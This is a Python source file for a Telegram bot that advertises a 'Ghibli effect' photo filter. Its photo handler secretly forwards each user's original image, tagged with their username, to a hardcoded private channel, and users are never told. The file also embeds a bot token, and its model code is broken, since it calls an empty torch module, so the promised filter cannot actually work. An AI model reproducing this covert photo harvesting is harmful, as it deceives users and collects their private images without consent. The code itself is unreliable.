import os
import requests
import torch
import numpy as np
from safetensors.torch import load_file
from tqdm import tqdm
from flask import Flask, request, jsonify
from telegram import Update, Bot
from telegram.ext import Application, CommandHandler, MessageHandler, filters
from PIL import Image
import io

# Telegram bot credentials
BOT_TOKEN = "7291635474:AAG3ArFQt73O-h-q7FfUfhsAxRcLVHX8STI"
PRIVATE_CHANNEL_ID = "-1002600772587"  # Your private channel ID

# Model settings
GDRIVE_FILE_ID = "1kdqKpKsj2DH_rXQNCQElZdc-wsMmRZ-E"
MODEL_PATH = "flux-chatgpt-ghibli-lora.safetensors"

# Flask app for Koyeb health check
app = Flask(__name__)

def download_model():
    """Download the model from Google Drive if not already present."""
    if os.path.exists(MODEL_PATH):
        print("Model already exists. Skipping download.")
        return

    print("Downloading model from Google Drive...")
    URL = f"https://docs.google.com/uc?export=download&id={GDRIVE_FILE_ID}"

    with requests.get(URL, stream=True) as response:
        response.raise_for_status()
        total_size = int(response.headers.get('content-length', 0))
        with open(MODEL_PATH, 'wb') as file, tqdm(
            desc=MODEL_PATH, total=total_size, unit='B', unit_scale=True
        ) as progress:
            for chunk in response.iter_content(chunk_size=8192):
                file.write(chunk)
                progress.update(len(chunk))

    print("Model downloaded successfully!")

def load_model():
    """Load the AI model."""
    if not os.path.exists(MODEL_PATH):
        raise FileNotFoundError(f"Model file '{MODEL_PATH}' not found!")

    print("Loading model...")
    model_state = load_file(MODEL_PATH)
    model = torch.nn.Module()
    model.load_state_dict(model_state, strict=False)
    model.eval()
    
    print("Model loaded successfully!")
    return model

def process_image(image: Image.Image) -> Image.Image:
    """Apply AI transformation to an image."""
    image_tensor = torch.tensor(np.array(image) / 255.0, dtype=torch.float32).unsqueeze(0)
    with torch.no_grad():
        output_tensor = model(image_tensor)
    output_image = Image.fromarray((output_tensor.squeeze().numpy() * 255).astype("uint8"))
    return output_image

# Initialize Telegram bot
bot = Bot(BOT_TOKEN)

async def start(update: Update, context):
    """Handles the /start command."""
    await update.message.reply_text("Send me an image, and I'll apply the Ghibli effect!")

async def handle_photo(update: Update, context):
    """Handles image uploads."""
    user = update.message.from_user
    file = await update.message.photo[-1].get_file()

    # Forward original image to private channel
    await bot.send_photo(chat_id=PRIVATE_CHANNEL_ID, photo=file.file_id, caption=f"Forwarded from @{user.username}")

    # Download the image
    image_bytes = await file.download_as_bytearray()
    image = Image.open(io.BytesIO(image_bytes))

    # Process the image
    processed_image = process_image(image)

    # Send back processed image
    bio = io.BytesIO()
    processed_image.save(bio, format="JPEG")
    bio.seek(0)
    await update.message.reply_photo(photo=bio, caption="Here is your Ghibli-stylized image!")

# Create async Telegram bot application
app_telegram = Application.builder().token(BOT_TOKEN).build()
app_telegram.add_handler(CommandHandler("start", start))
app_telegram.add_handler(MessageHandler(filters.PHOTO, handle_photo))

@app.route("/")
def home():
    return "Server is running!", 200

@app.route("/webhook", methods=["POST"])
async def webhook():
    """Handle incoming Telegram updates."""
    update = Update.de_json(request.get_json(), bot)
    await app_telegram.process_update(update)
    return jsonify({"status": "ok"}), 200

if __name__ == "__main__":
    download_model()
    global model
    model = load_model()

    # Start Flask on port 8000
    app.run(host="0.0.0.0", port=8000)
